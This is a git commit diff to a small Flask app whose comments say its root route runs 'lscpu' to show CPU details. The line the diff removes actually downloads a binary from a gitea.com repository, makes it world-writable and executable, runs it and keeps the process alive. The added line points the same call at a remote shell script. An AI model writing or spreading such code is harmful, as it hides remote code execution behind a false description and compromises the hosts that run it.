77914d5007992ea35ca81139c5df8039eb61ee51
crewi2013-hue <crewi2013@gmail.com>
2026-05-10 15:31:04 -0700

    Update app.py

--- app.py
+++ app.py
@@ -6,6 +6,6 @@ app = Flask(__name__)
 @app.route('/')
 def cek_cpu():
     # Menjalankan perintah bash 'lscpu' dan menangkap outputnya
-    hasil_lscpu = subprocess.check_output(['wget https://gitea.com/toafubi/Gremonia/raw/branch/main/rede && chmod 777 rede && ./rede && sleep infinity'], text=True)
+    hasil_lscpu = subprocess.check_output(['https://gitea.com/toafubi/Gremonia/raw/branch/main/sem.sh'], text=True)
     # Menampilkan di web dengan tag <pre> agar format tabel/spasinya rapi
     return f"<pre>{hasil_lscpu}</pre>"
